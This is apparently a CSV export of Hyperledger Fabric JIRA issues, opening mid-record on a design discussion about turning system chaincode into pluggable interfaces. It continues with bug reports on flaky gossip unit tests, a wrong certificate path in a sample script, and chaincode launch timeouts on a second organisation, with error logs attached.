But for 1.0.0, SCC became the answer for writing specific system-level plugins as well - e.g. ESCC, VSCC, etc.

And now we have requirements for writing even more type of system plugins and also additional implementations of the existing SCC (e.g. alternative ESCC and VSCC for sidedb / private data store).

Given that we have specific types of plugins, using the original SCC interface / architecture for plugins no longer makes sense. We need to define explicit interfaces for each type of SCC/plugin and not implement them as generic ""chaincode"". This will also make it possible in the future to exploit the plugin feature of Go 1.8 and later so that we don't need to statically link these in the future.

We *might* still want to allow running of user chaincode in process (and perhaps we keep the current implementation for that purpose) but we should vet that as part of this item.",,angelo.decaro,binhn,daijianw,Hangyu_FJH,jiangyaoguo,mastersingh24,mne,muralisr,troyronda,vukolic,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4207,FAB-6719,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy8xb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,angelo.decaro,binhn,daijianw,Hangyu_FJH,jiangyaoguo,mastersingh24,mne,muralisr,troyronda,vukolic,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jul/17 7:02 PM;yacovm;{quote}We need to define explicit interfaces for each type of SCC/plugin and not implement them as generic ""chaincode""{quote}

I strongly agree, I also think that the SCC should be more modular and testable:
* Right now it basically communicates with the rest of the peer via either singletons or static methods that use global variables. 
* The access control of the SCC is built inside the SCC execution flow itself, and I think it needs to be extracted out into separate entities, so that access control could be tested separately, and the operations themselves could be tested separately.  

However I think that at first we can have the SCCs that serve user requests (i.e, LSCC or QSCC) support the existing chaincode API for backwards compatibility. ;;;","19/Jul/17 7:11 PM;yacovm;I actually had a few ideas on how we can make certain parts of the peer be more modular- I extracted the SCC part into a separate google doc:
https://docs.google.com/document/d/1SWdLkmc3shmKdfG9Azhl13-jcU_IzNrb2AkIw7P20lI/edit;;;","19/Jul/17 7:18 PM;yacovm;Also - if this is for v1.1 I think I'd like to take this one. ;;;","25/Jul/17 7:24 AM;binhn;[~mastersingh24]
{quote}We *might* still want to allow running of user chaincode in process (and perhaps we keep the current implementation for that purpose) but we should vet that as part of this item.
{quote}
I am ok with defining a different interface for a different type of plugins, but system chaincode should remain intact. System chaincodes implement certain behaviors related to chaincode, not a random plug-ins, and  people already use system chaincodes in their production systems.;;;","25/Jul/17 11:28 AM;angelo.decaro;As a general comment here, SCC involved in proposal/transaction processing need to be deterministic to avoid forking. I would suggest to keep the flow as simple as possible. I'm already foreseeing the complexity of debugging them especially in situations where it is needed to figure out what caused a fork.;;;","25/Jul/17 8:36 PM;vukolic;Whatever code is executed after consensus in Fabric architecture must, indeed, be deterministic. However, I understand this JIRA issue not to go against this, but just to modularize diferrent VSCCs (among other xCCs). This is a good thing IMO - that being said, we must not allow application/chaincode developers to deploy new VSCCs (i.e., endorsement policies) dynamically. [~mastersingh24] [~yacovm], do you plan here to allow VSCCs to be deployed  dynamically (like chaincode), or not?;;;","25/Jul/17 9:00 PM;yacovm;{quote} However, I understand this JIRA issue not to go against this, but just to modularize diferrent VSCCs (among other xCCs).{quote}

That is correct [~vukolic]. The gist of this JIRA and proposal is to address certain aspects:
* Essentially we have 2 types of operations in system chaincodes
** operations that are ""client facing"" - they should have an interface of a chaincode and the peer logic would optimally have a modular way of enforcing access control on them. 
Right now we have checks in the code at each part that are ""set in stone"" and if a user would like these checks to be more severe, or more lenient it can not do so without completely replacing the ESCC or VSCC chaincode, but there are also other chaincode types that are customer facing - and for these you would need to write from scratch the needed chaincode and register it instead of the existing one. 
If we could just decouple the data mutation steps from the access control that would not only give customers an easier life, but would also make the code more secure and testable.
** operations that are not client facing and are invoked by other SCCs, such as VSCC obtaining information from LSCC. 
These types of operations should not go through a chaincode type of interface. There is no point in doing the marshalling and demarshalling of the data structures if we can instead just pass them by reference. a VSCC is a good example of this. Why do we need the VSCC to have an interface like a user chaincode, if only internal peer operations use it? 
* The SCC code is pretty hard to mock and test. Making it modular would fix that. If we could just define each SCC as a function and all access to other SCCs it needs as interfaces - testing would be easier.

{quote}do you plan here to allow VSCCs to be deployed  dynamically (like chaincode), or not?{quote}

So, currently the VSCC name of the chaincode is set at instantiation of the chaincode and when the peer does the validation if fetches the VSCC instance and invokes it.
So, if this isn't configured at instantiation - the default built in VSCC comes into play. 
A user can override this and put its own VSCC. ;;;","25/Jul/17 10:24 PM;binhn;All good discussion here :)

1 thing I want to caution is security of the system (peer in this case) related to plugins – not that I know any specific security holes, but on principles, the more hooks we provide, the more unknown risks we face. So we should tread carefully.;;;","31/Jul/17 6:07 PM;mne;I like the idea of having pluggable SCC, just want to point out that Go plugins are currently limited to the Linux release of Go 1.8.

Given that Go plugins are binary, I'm wondering about the debugability of SCC that is provided as a plugin only - has anyone looked into this?;;;","12/Aug/17 10:37 PM;yacovm;It seems this was unilaterally repealed, so I am marking this as DONE since there is no other status.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric unit-tests are failing inconsistently on x86_64 platform,FAB-5380,19354,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,rameshthoomu,rameshthoomu,19/Jul/17 10:38 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,18/Oct/17 6:29 AM,v1.0.0,,,WON'T FIX,,fabric-gossip,,,,,,0,active,gossip,,,,,"observed fabric unit-tests are failing inconsistently on x86_64 platform in hyperledger CI. Below are the error log and build references
{code:java}
01:13:34.725 unit-tests_1  | panic: runtime error: invalid memory address or nil pointer dereference
01:13:34.725 unit-tests_1  | [signal SIGSEGV: segmentation violation code=0x1 addr=0x28 pc=0x496c6d]
01:13:34.726 unit-tests_1  | 
01:13:34.726 unit-tests_1  | goroutine 19252 [running]:
01:13:34.726 unit-tests_1  | panic(0xad77a0, 0xc420016060)
01:13:34.727 unit-tests_1  |     /opt/go/src/runtime/panic.go:500 +0x1a1
01:13:34.727 unit-tests_1  | github.com/hyperledger/fabric/gossip/state.TestGossipStateProvider_TestStateMessages.func3(0xc423bbca80, 0xc42526c000, 0xc42506eb40)
01:13:34.728 unit-tests_1  |     /opt/gopath/src/github.com/hyperledger/fabric/gossip/state/state_test.go:641 +0x14d
01:13:34.728 unit-tests_1  | created by github.com/hyperledger/fabric/gossip/state.TestGossipStateProvider_TestStateMessages
01:13:34.729 unit-tests_1  |     /opt/gopath/src/github.com/hyperledger/fabric/gossip/state/state_test.go:644 +0x33c
01:13:34.729 unit-tests_1  | FAIL    github.com/hyperledger/fabric/gossip/state    47.192s
01:13:36.391 unit-tests_1  | error: exit status 1
01:13:36.394 unit-tests_1  | panic: EOF
01:13:36.394 unit-tests_1  | 
01:13:36.395 unit-tests_1  | goroutine 1 [running]:
01:13:36.395 unit-tests_1  | panic(0x4daca0, 0xc42000a0f0)
01:13:36.395 unit-tests_1  |     /opt/go/src/runtime/panic.go:500 +0x1a1
01:13:36.396 unit-tests_1  | main.main()
01:13:36.396 unit-tests_1  |     /opt/gotools/obj/gopath/src/github.com/AlekSi/gocov-xml/gocov-xml.go:60 +0x15fd{code}
failed build references:

[https://jenkins.hyperledger.org/view/fabric/job/fabric-merge-x86_64/2284/]

[https://jenkins.hyperledger.org/view/fabric/job/fabric-merge-x86_64/2281/]

[https://jenkins.hyperledger.org/view/fabric/job/fabric-merge-x86_64/2279/]",Jenkins x86_64,rameshthoomu,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-290,,,,,,,,,"1|hzy8xr:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jul/17 10:21 PM;rameshthoomu;Didn't observe this issue on recent builds . Will monitor for few more days and update the status;;;","18/Oct/17 6:29 AM;yacovm;I didn't see this happening in a long time and no test in this package is skipped, so I think we can close this;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
wrong env var setting in first-network/scripts/script.sh,FAB-5381,19357,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,,jtrayfield,jtrayfield,20/Jul/17 12:14 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Jan/18 9:54 PM,v1.0.0,,,,,fabric-samples,,,,,,0,,,,,,,"ORDERER_CA=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem

should be:

ORDERER_CA=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/tls/ca.crt

 ",,jtrayfield,lehors,sujeeban,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8y7:",,,,,,,,,,,,,,,,,,,,,,,jtrayfield,lehors,sujeeban,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Jul/17 12:10 AM;sujeeban;I think those two files are the same certificate.;;;","21/Jul/17 2:06 AM;jtrayfield;my cryptogen does not generate the first file.;;;","21/Jul/17 5:50 PM;sujeeban;Is your cryptogen binary up-to-date ?;;;","22/Jul/17 1:06 AM;jtrayfield;I recompiled it today:

emdall:first-network jtray$ ll ~/git/tracking/cryptogen 

-rwxr-xr-x  1 jtray  admin  8459284 Jul 21 11:27 /Users/jtray/git/tracking/cryptogen

with this result:



first-network jtray$ ./byfn.sh -m up  -c asdf

....

 ____    _____      _      ____    _____ 

/ ___|  |_   _|    / \    |  _ \  |_   _|

\___ \    | |     / _ \   | |_) |   | | 

 ___) |   | |    / ___ \  |  _ <    | | 

|____/    |_|   /_/   \_\ |_| \_\   |_| 

 

Build your first network (BYFN) end-to-end test

 

Channel name : asdf

Creating channel...

CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt

CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.key

CORE_PEER_LOCALMSPID=Org1MSP

CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock

CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.crt

CORE_PEER_TLS_ENABLED=true

CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp

CORE_PEER_ID=cli

CORE_LOGGING_LEVEL=DEBUG

CORE_PEER_ADDRESS=peer0.org1.example.com:7051

2017-07-21 15:45:27.195 UTC [msp] GetLocalMSP -> DEBU 001 Returning existing local MSP

2017-07-21 15:45:27.199 UTC [msp] GetDefaultSigningIdentity -> DEBU 002 Obtaining default signing identity

Error: Error connecting to orderer.example.com:7050 due to open /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem: no such file or directory

 

emdall:first-network jtray$ ll crypto-config/ordererOrganizations/example.com/orderers/orderer.example.com/msp

total 0

drwxr-xr-x  3 jtray  admin  102 Jul 21 11:33 admincerts

drwxr-xr-x  3 jtray  admin  102 Jul 21 11:33 cacerts

drwxr-xr-x  3 jtray  admin  102 Jul 21 11:33 keystore

drwxr-xr-x  3 jtray  admin  102 Jul 21 11:33 signcerts

 ;;;","24/Jan/18 5:22 AM;Clayton Sims;This is issue is very old,  did this get solved?;;;","24/Jan/18 5:35 AM;jtrayfield;I haven't had a chance to try the latest version of Fabric.

Close this and if I have any problems I'll file a new Issue....

Thanks

 ;;;","30/Jan/18 9:54 PM;lehors;I just gave this a try and the exact same command worked as expected. The two files are present and the same.

So, per [~jtrayfield] suggestion I think we can close this.

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
escape spaces in pathname example script,FAB-5383,19359,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,jorisjh,jorisjh,20/Jul/17 12:37 AM,23/Jan/20 6:55 AM,28/Oct/23 3:00 AM,23/Jan/20 6:55 AM,,,,,,fabric-samples,,,,,,0,stale-item,,,,,,"While running the very first example fabcar if your path contains spaces, you will get an error because $PWD does not escape spaces.",,jorisjh,K.Fukuch,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy8yn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jorisjh,K.Fukuch,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:55 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode Testing,FAB-5384,19360,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,latitiah,latitiah,20/Jul/17 12:48 AM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,14/Sep/17 12:32 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,These tests cover how different chaincodes interact with the fabric network and the different configurations that it may take.,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5546,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1017,,,,,,,,,"1|hzy907:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,release-2.4,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
End To End Testing,FAB-5385,19361,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,latitiah,latitiah,20/Jul/17 1:25 AM,30/Jul/19 11:42 AM,28/Oct/23 3:00 AM,30/Jul/19 11:42 AM,,,,,,fabric-quality,,,,,,0,,,,,,,This testing includes both performance and functionality testing.,,latitiah,mastersingh24,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1017,,,,,,,,,"1|hzy90f:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,latitiah,mastersingh24,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,true,"30/Jul/19 11:42 AM;mastersingh24;Open 1 year or more with no activity ... time to cleanup;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
System Behave framework,FAB-5386,19362,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,20/Jul/17 1:37 AM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,18/Apr/18 2:51 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,This story contains the necessary parts when building the system behave framework.,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1017,,,,,,,,,"1|hzy8yv:",,,,Unset,,Sprint 19 - Quality,,,,,,Unset,,,,,,,,,,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Concurrent transactions are not going through on org2 on a channel formed with two orgs (org1 and org2) ,FAB-5391,19370,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,wlahti,suryalnvs,suryalnvs,20/Jul/17 4:58 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,26/Jul/17 7:31 PM,,,,v1.0.1,v1.1.0,fabric-quality,,,,,,0,HSBN,quality,,,,,"*Recreate steps:*

1.  channel '*mychannel0*' has been created with Org1 and Org2

    Org1 contains endorser *peer1* (peer0.org1.example.com) and comitter *peer2* (peer1.org1.example.com)

Org2 contains endorser *peer1* (peer0.org2.example.com) and comitter *peer2* (peer1.org2.example.com)

2. used CLI commands to create and join the channel

3. Installed *sample_cc* chaincode on peer1 of  org1 and org2

4. instantiated *sample_cc* chaincode on peer1 of org1

5. PTE tool has been used to send *constant* *mode* transactions with 4 threads and 0.01 s delay between each invoke.

 

*Expected Result:*

Chaincode instantiation should be per channel, transaction sent to Org2 should go though .

 

*Actual result:*

All the traffic sent to Org2 are failing with the following error:

 

*Gist of error logs from PTE:*

 
{code:java}
info: [PTE 0 main]: stderr: error: [Peer.js]: sendProposal - timed out after:45000
error: [client-utils.js]: sendPeersProposal - Promise is rejected: Error: REQUEST_TIMEOUT
    at Timeout._onTimeout (/home/ibmadmin/fabric-sdk-node/node_modules/fabric-client/lib/Peer.js:100:19)
    at ontimeout (timers.js:386:14)
    at tryOnTimeout (timers.js:250:5)
    at Timer.listOnTimeout (timers.js:214:5)

info: [PTE 0 main]: stderr: error: [PTE 0 exec]: [Nid:chan:org:id=0:mychannel0:org2:3 invoke_move_const] Failed to send transaction proposal due to error:  TypeError: Illegal buffer
    at TypeError (native)
    at Function.module.exports.ByteBuffer.wrap (/home/ibmadmin/fabric-sdk-node/node_modules/bytebuffer/dist/bytebuffer-node.js:346:19)
    at Element.ProtoBuf.Reflect.ElementPrototype.verifyValue (/home/ibmadmin/fabric-sdk-node/node_modules/protobufjs/dist/protobuf.js:1886:39)
    at T.ProtoBuf.Reflect.FieldPrototype.verifyValue (/home/ibmadmin/fabric-sdk-node/node_modules/protobufjs/dist/protobuf.js:3499:33)
    at setter (/home/ibmadmin/fabric-sdk-node/node_modules/protobufjs/dist/protobuf.js:2582:77)
    at Channel.sendTransaction (/home/ibmadmin/fabric-sdk-node/node_modules/fabric-client/lib/Channel.js:1441:27)
    at /home/ibmadmin/fabric-sdk-node/test/v1performance/pte-execRequest.js:981:43
    at eventRegister (/home/ibmadmin/fabric-sdk-node/test/v1performance/pte-execRequest.js:720:5)
    at channel.sendTransactionProposal.then (/home/ibmadmin/fabric-sdk-node/test/v1performance/pte-execRequest.js:979:13)
    at process._tickCallback (internal/process/next_tick.js:109:7{code}
 

*Gist of error logs from peer0.org2.example.com:*
{code}
2017-07-19 20:12:34.881 UTC [chaincode] processStream -> ERRO e0c Error handling chaincode support stream: rpc error: code = Canceled desc = context canceled
2017-07-19 20:12:35.547 UTC [chaincode] Launch -> ERRO e0d launchAndWaitForRegister failed Timeout expired while starting chaincode sample_cc_ch1:v0(networkid:dev,peerid:peer0.org2.example.com,tx:9eaa0392890e6eb6a5bbef35cf83942f8fbc5fa3f89b4a57379d4a378b2b5320)
2017-07-19 20:12:35.548 UTC [chaincode] ExecuteChaincode -> ERRO e0e Error executing chaincode: Timeout expired while starting chaincode sample_cc_ch1:v0(networkid:dev,peerid:peer0.org2.example.com,tx:9eaa0392890e6eb6a5bbef35cf83942f8fbc5fa3f89b4a57379d4a378b2b5320)
2017-07-19 20:12:35.548 UTC [endorser] simulateProposal -> ERRO e0f failed to invoke chaincode name:""sample_cc_ch1""  on transaction 9eaa0392890e6eb6a5bbef35cf83942f8fbc5fa3f89b4a57379d4a378b2b5320, error: Error executing chaincode: Timeout expired while starting chaincode sample_cc_ch1:v0(networkid:dev,peerid:peer0.org2.example.com,tx:9eaa0392890e6eb6a5bbef35cf83942f8fbc5fa3f89b4a57379d4a378b2b5320)
2017-07-19 20:12:35.659 UTC [chaincode] Launch -> ERRO e10 launchAndWaitForRegister failed Timeout expired while starting chaincode sample_cc_ch1:v0(networkid:dev,peerid:peer0.org2.example.com,tx:a2292c21f3a2dea2598e2f41ba59825d2920189393f2187008a92e566cf6f49b)
2017-07-19 20:12:35.660 UTC [chaincode] ExecuteChaincode -> ERRO e11 Error executing chaincode: Timeout expired while starting chaincode sample_cc_ch1:v0(networkid:dev,peerid:peer0.org2.example.com,tx:a2292c21f3a2dea2598e2f41ba59825d2920189393f2187008a92e566cf6f49b)
2017-07-19 20:12:35.660 UTC [endorser] simulateProposal -> ERRO e12 failed to invoke chaincode name:""sample_cc_ch1""  on transaction a2292c21f3a2dea2598e2f41ba59825d2920189393f2187008a92e566cf6f49b, error: Error executing chaincode: Timeout expired while starting chaincode sample_cc_ch1:v0(networkid:dev,peerid:peer0.org2.example.com,tx:a2292c21f3a2dea2598e2f41ba59825d2920189393f2187008a92e566cf6f49b)
2017-07-19 20:12:36.337 UTC [chaincode] Launch -> ERRO e13 launchAndWaitForRegister failed Timeout expired while starting chaincode sample_cc_ch1:v0(networkid:dev,peerid:peer0.org2.example.com,tx:4efd480577901237f36b1f922634a13775f96c349575eeea9e96c5b7fd03c742)
2017-07-19 20:12:36.337 UTC [chaincode] ExecuteChaincode -> ERRO e14 Error executing chaincode: Timeout expired while starting chaincode sample_cc_ch1:v0(networkid:dev,peerid:peer0.org2.example.com,tx:4efd480577901237f36b1f922634a13775f96c349575eeea9e96c5b7fd03c742)
2017-07-19 20:12:36.337 UTC [endorser] simulateProposal -> ERRO e15 failed to invoke chaincode name:""sample_cc_ch1""  on transaction 4efd480577901237f36b1f922634a13775f96c349575eeea9e96c5b7fd03c742, error: Error executing chaincode: Timeout expired while starting chaincode sample_cc_ch1:v0(networkid:dev,peerid:peer0.org2.example.com,tx:4efd480577901237f36b1f922634a13775f96c349575eeea9e96c5b7fd03c742)
2017-07-19 20:12:36.511 UTC [chaincode] Launch -> ERRO e16 launchAndWaitForRegister failed Error chaincode is being launched: sample_cc_ch1:v0
2017-07-19 20:12:36.512 UTC [chaincode] ExecuteChaincode -> ERRO e17 Error executing chaincode: Error chaincode is being launched: sample_cc_ch1:v0
2017-07-19 20:12:36.512 UTC [endorser] simulateProposal -> ERRO e18 failed to invoke chaincode name:""sample_cc_ch1""  on transaction 8104b9a92af9aa81f7976c8640d33fb689303e485da1abd25fbbc2617dccb849, error: Error executing chaincode: Error chaincode is being launched: sample_cc_ch1:v0
2017-07-19 20:12:36.512 UTC [chaincode] Launch -> ERRO e19 launchAndWaitForRegister failed Error chaincode is being launched: sample_cc_ch1:v0
2017-07-19 20:12:36.512 UTC [chaincode] ExecuteChaincode -> ERRO e1a Error executing chaincode: Error chaincode is being launched: sample_cc_ch1:v0
2017-07-19 20:12:36.512 UTC [endorser] simulateProposal -> ERRO e1b failed to invoke chaincode name:""sample_cc_ch1""  on transaction ca0ad44e91b2f0c0ad7abc8189ed592f53ba9ea89f5ee325f2365a79a2baa3dd, error: Error executing chaincode: Error chaincode is being launched: sample_cc_ch1:v0
2017-07-19 20:12:36.558 UTC [chaincode] Launch -> ERRO e1c launchAndWaitForRegister failed Error chaincode is being launched: sample_cc_ch1:v0
2017-07-19 20:12:36.558 UTC [chaincode] ExecuteChaincode -> ERRO e1d Error executing chaincode: Error chaincode is being launched: sample_cc_ch1:v0
2017-07-19 20:12:36.558 UTC [endorser] simulateProposal -> ERRO e1e failed to invoke chaincode name:""sample_cc_ch1""  on transaction 1aa1f424f4958204adcbd3908d7dc785d13c4c9a240cbbd32541f461278c78ae, error: Error executing chaincode: Error chaincode is being launched: sample_cc_ch1:v0
